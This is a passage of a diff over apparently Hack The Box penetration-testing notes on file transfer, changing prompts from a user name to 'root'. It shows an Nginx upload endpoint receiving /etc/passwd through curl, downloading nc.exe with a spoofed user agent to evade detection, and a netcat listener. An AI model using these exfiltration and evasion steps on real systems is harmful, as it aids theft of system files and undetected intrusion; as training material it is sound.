-AbdulrahmanTamim@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+root@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
 ```
 
 **Start Nginx**
@@ -1704,7 +1704,7 @@ AbdulrahmanTamim@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /e
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo systemctl restart nginx.service
+root@htb[/htb]$ sudo systemctl restart nginx.service
 ```
 
 If we get any error messages, check `/var/log/nginx/error.log`. If using Pwnbox, we will see port 80 is already in use.
@@ -1714,7 +1714,7 @@ If we get any error messages, check `/var/log/nginx/error.log`. If using Pwnbox,
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tail -2 /var/log/nginx/error.log
+root@htb[/htb]$ tail -2 /var/log/nginx/error.log
 
 2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
 2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
@@ -1723,7 +1723,7 @@ AbdulrahmanTamim@htb[/htb]$ tail -2 /var/log/nginx/error.log
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ss -lnpt | grep 80
+root@htb[/htb]$ ss -lnpt | grep 80
 
 LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
 ```
@@ -1731,7 +1731,7 @@ LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ps -ef | grep 2811
+root@htb[/htb]$ ps -ef | grep 2811
 
 user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
 root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
@@ -1744,7 +1744,7 @@ We see there is already a module listening on port 80. To get around this, we ca
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
+root@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
 ```
 
 Now we can test uploading by using `cURL` to send a `PUT` request. In the below example, we will upload the `/etc/passwd` file to the server and call it users.txt
@@ -1754,13 +1754,13 @@ Now we can test uploading by using `cURL` to send a `PUT` request. In the below 
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+root@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
 ```
 
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+root@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
 
 user65:x:1000:1000:,,,:/home/user65:/bin/bash
 ```
@@ -2117,7 +2117,7 @@ PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -Ou
 &#x20; Evading Detection
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp 80
+root@htb[/htb]$ nc -lvnp 80
 
 listening on [any] 80 ...
 connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
